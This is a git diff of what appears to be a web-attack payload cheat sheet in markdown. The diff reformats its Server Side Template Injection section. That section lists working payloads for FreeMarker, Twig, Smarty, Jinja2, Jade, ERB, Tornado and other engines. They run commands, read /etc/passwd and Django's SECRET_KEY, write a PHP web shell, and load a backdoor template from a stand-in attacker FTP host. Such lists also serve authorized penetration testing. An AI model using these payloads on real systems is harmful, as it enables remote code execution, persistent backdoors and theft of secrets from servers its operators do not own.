@@ -30,6 +30,7 @@
       - [XSS to LFI](#xss-to-lfi)
   - [XML External Entity (XXE)](#xxe-common-payloads)
   - [Server Side Template Injection (SSTI)](#server-side-template-injection-ssti)
+      - [SSTI CheatSheet](#ssti-cheatsheet)
   - [Sever Side Request Forgery (SSRF)](#ssrf-common-payloads)
   - [Client Side Request Forgerty (CSRF)](#csrf-common-payloads)
   - [Carriage Return and Line Feed (CRLF)](#crlf-common-payloads)
@@ -320,18 +321,18 @@ If the output of the `win.ini` file on the target returns the response message, 
 --------------------------------------------------------------------------------------------------------------
 # Server Side Template Injection (SSTI)
 
-### SSTI full cheatsheet
-Polyglot
+## SSTI CheatSheet
+### `Polyglot`
 ```
 ${{<%[%'"}}%\.
 ```
 
-FreeMarker (Java):
+### `FreeMarker (Java)`
 ```
 ${7*7} = 49
 <#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
 ```
-Java
+### `Java`
 ```
 ${7*7}
 ${{7*7}}
@@ -342,7 +343,7 @@ ${T(java.lang.System).getenv()}
 ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
 ```
 
-Twig (PHP):
+### `Twig (PHP)`
 ```
 {{7*7}}
 {{7*'7'}}
@@ -352,13 +353,13 @@ Twig (PHP):
 {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
 ```
 
-Smarty (PHP):
+### `Smarty (PHP)`
 ```
 {$smarty.version}
 {php}echo `id`;{/php}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 ```
-Handlebars(NodeJS):
+### `Handlebars(NodeJS)`
 ```
 wrtz{{#with "s" as |string|}}
 {{#with "e"}}
@@ -380,7 +381,7 @@ wrtz{{#with "s" as |string|}}
 {{/with}}
 {{/with}}
 ```
-Velocity:
+### `Velocity`
 ```
 #set($str=$class.inspect("java.lang.String").type)
 #set($chr=$class.inspect("java.lang.Character").type)
@@ -391,43 +392,43 @@ $ex.waitFor()
 $str.valueOf($chr.toChars($out.read()))
 #end
 ```
-ERB (Ruby):
+### `ERB (Ruby)`
 ```
 <%= system("whoami") %>
 <%= Dir.entries('/') %>
 <%= File.open('/example/arbitrary-file').read %>
 ```
-Django Tricks (Python):
+### `Django Tricks (Python)`
 ```
 {% debug %}
 {{settings.SECRET_KEY}}
 ```
-Tornado (Python):
+### `Tornado (Python)`
 ```
 {% import foobar %} = Error
 {% import os %}{{os.system('whoami')}}
 ```
-Mojolicious (Perl):
+### `Mojolicious (Perl)`
 ```
 <%= perl code %>
 <% perl code %>
 ```
-Flask/Jinja2: Identify:
+### `Flask/Jinja2: Identify`
 ```
 {{ '7'*7 }}
 {{ [].class.base.subclasses() }} # get all classes
 {{''.class.mro()[1].subclasses()}}
 {%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
 ```
-Flask/Jinja2: 
+### `Flask/Jinja2` 
 ```
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 ```
-Jade:
+### `Jade`
 ```
 #{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
 ```
-Razor (.Net):
+### `Razor (.Net)`
 ```
 @(1+2)
 @{// C# code}
